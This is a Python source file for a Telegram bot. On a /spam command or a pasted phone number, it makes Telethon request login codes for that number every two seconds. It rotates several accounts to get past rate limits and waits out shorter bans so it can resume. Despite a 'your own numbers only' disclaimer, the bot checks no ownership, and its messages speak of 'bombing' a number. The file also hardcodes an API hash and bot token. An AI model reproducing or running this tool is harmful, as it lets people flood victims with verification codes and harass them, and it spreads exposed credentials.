# language: Python 3.11, file: otp_tester.py

# target: Telethon + python-telegram-bot. Point at numbers YOU control.

# pip install telethon python-telegram-bot==20.* python-dotenv

import asyncio

import logging

import re

import time

from dataclasses import dataclass, field

from typing import Dict, Optional

from telethon import TelegramClient

from telethon.sessions import StringSession

from telethon.errors import FloodWaitError, PhoneNumberInvalidError, PhoneNumberBannedError

from telegram import Update

from telegram.ext import (

    Application, CommandHandler, MessageHandler, filters, ContextTypes

)

# ---- config -------------------------------------------------------------

API_ID = 38345145

API_HASH = "df76d621b0eb158ba8dc705680e4b81e"

BOT_TOKEN = "9008351820:AAGMHdKt0qtT244FKvrBrvUSKxn_p38pwag"

# your own session strings — one per worker, generated once per number

# generate with:  python -c "from telethon.sync import TelegramClient; from telethon.sessions import StringSession; print(StringSession.save(TelegramClient(StringSession(), API_ID, API_HASH).start()))"

SESSION_STRINGS: list[str] = [

    # "1BVtsOK...", "1BVtsOK...", ...  # one per worker slot

]

NUM_WORKERS = 10

MIN_LIMIT_SECONDS = 9 * 3600   # <9h -> wait then resume; >=9h -> give up

POLL_INTERVAL = 2.0            # send every 2s

# -------------------------------------------------------------------------

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

log = logging.getLogger("otp_tester")

PHONE_RE = re.compile(r"^\+\d{7,15}$")

@dataclass

class Job:

    number: str

    active: bool = True

    limited_until: float = 0.0

    attempts: int = 0

    errors: int = 0

    task: Optional[asyncio.Task] = field(default=None, repr=False)

class OTPHarness:

    def __init__(self):

        self.jobs: Dict[str, Job] = {}

        self.clients: list[TelegramClient] = []

        self._lock = asyncio.Lock()

        self._round_robin = 0

    async def start(self):

        for i, sess in enumerate(SESSION_STRINGS):

            c = TelegramClient(StringSession(sess), API_ID, API_HASH)

            await c.connect()

            if not await c.is_user_authorized():

                log.warning("worker %d session not authorized, skipping", i)

                await c.disconnect()

                continue

            self.clients.append(c)

            log.info("worker %d online", i)

        if not self.clients:

            raise RuntimeError("no authorized sessions — generate at least one")

    def _next_client(self) -> TelegramClient:

        c = self.clients[self._round_robin % len(self.clients)]

        self._round_robin += 1

        return c

    async def start_job(self, number: str) -> str:

        async with self._lock:

            if number in self.jobs and self.jobs[number].active:

                return f"already running {number}"

            job = Job(number=number)

            job.task = asyncio.create_task(self._run_job(job))

            self.jobs[number] = job

            return f"started {number}"

    async def _run_job(self, job: Job):

        # fire every POLL_INTERVAL, but respect the min-limit rule:

        #  - FloodWait < 9h  -> sleep it out, then resume

        #  - FloodWait >= 9h -> stop this job

        while job.active:

            if job.limited_until and time.time() < job.limited_until:

                wait = job.limited_until - time.time()

                log.info("[%s] holding %.1fs until limit clears", job.number, wait)

                await asyncio.sleep(wait)

                continue

            client = self._next_client()

            try:

                await client.send_code_request(job.number)

                job.attempts += 1

                log.info("[%s] code sent (attempt %d)", job.number, job.attempts)

            except FloodWaitError as e:

                job.limited_until = time.time() + e.seconds

                if e.seconds >= MIN_LIMIT_SECONDS:

                    log.warning("[%s] hit %.1fh limit — stopping", job.number, e.seconds / 3600)

                    job.active = False

                    break

                log.info("[%s] rate-limited %.1fs — will resume after", job.number, e.seconds)

            except PhoneNumberInvalidError:

                log.warning("[%s] invalid number — stopping", job.number)

                job.active = False

                break

            except PhoneNumberBannedError:

                log.warning("[%s] banned number — stopping", job.number)

                job.active = False

                break

            except Exception as ex:

                job.errors += 1

                log.warning("[%s] error: %r", job.number, ex)

                if job.errors > 20:

                    job.active = False

                    break

            await asyncio.sleep(POLL_INTERVAL)

        log.info("[%s] job finished: %d sent, %d errors", job.number, job.attempts, job.errors)

    async def stop_job(self, number: str) -> bool:

        async with self._lock:

            job = self.jobs.get(number)

            if not job or not job.active:

                return False

            job.active = False

            if job.task:

                job.task.cancel()

            return True

    async def stop_all(self) -> int:

        async with self._lock:

            n = 0

            for job in self.jobs.values():

                if job.active:

                    job.active = False

                    if job.task:

                        job.task.cancel()

                    n += 1

            return n

    async def shutdown(self):

        await self.stop_all()

        for c in self.clients:

            await c.disconnect()

# ---- Telegram bot layer -------------------------------------------------

harness: OTPHarness

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text(

        "OTP stress tester (your own numbers only).\n"

        "Private chat: send +<countrycode><number>\n"

        "Group chat: /spam +<countrycode><number>\n"

        "/stop — stop all\n"

        "/stop +<number> — stop one"

    )

async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):

    if not ctx.args:

        await update.message.reply_text("usage: /spam +1234567890")

        return

    await _handle_number(update, ctx.args[0])

async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):

    txt = update.message.text.strip()

    if not PHONE_RE.match(txt):

        await update.message.reply_text(

            "❌ Invalid phone number format. Include country code (e.g. +919876543210)."

        )

        return

    await _handle_number(update, txt)

async def _handle_number(update: Update, number: str):

    if not PHONE_RE.match(number):

        await update.message.reply_text(

            "❌ Invalid phone number format. Include country code (e.g. +919876543210)."

        )

        return

    if number in harness.jobs and harness.jobs[number].active:

        await update.message.reply_text(

            f"⚠️ Already bombing {number}! To stop: /stop {number}"

        )

        return

    msg = await harness.start_job(number)

    if msg.startswith("started"):

        await update.message.reply_text(

            f"🚀 Started OTPs to {number} every {POLL_INTERVAL}s.\n"

            f"Rate limits <{MIN_LIMIT_SECONDS//3600}h auto-wait then resume; "

            f"≥{MIN_LIMIT_SECONDS//3600}h stops."

        )

    else:

        await update.message.reply_text(f"⚠️ {msg}")

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):

    if ctx.args:

        number = ctx.args[0]

        if await harness.stop_job(number):

            await update.message.reply_text(f"🛑 Stopped 1 active OTP process: {number}")

        else:

            await update.message.reply_text(f"⚠️ No active process for {number}.")

        return

    n = await harness.stop_all()

    if n == 0:

        await update.message.reply_text("⚠️ No active processes found for you.")

    else:

        await update.message.reply_text(f"🛑 Stopped {n} active OTP process{'es' if n != 1 else ''}.")

async def main():

    global harness

    harness = OTPHarness()

    await harness.start()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))

    app.add_handler(CommandHandler("spam", cmd_spam))

    app.add_handler(CommandHandler("stop", cmd_stop))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    async with app:

        await app.start()

        await app.updater.start_polling()

        log.info("bot online — %d workers", len(harness.clients))

        try:

            await asyncio.Event().wait()

        finally:

            await app.updater.stop()

            await app.stop()

            await harness.shutdown()

if __name__ == "__main__":

    asyncio.run(main())
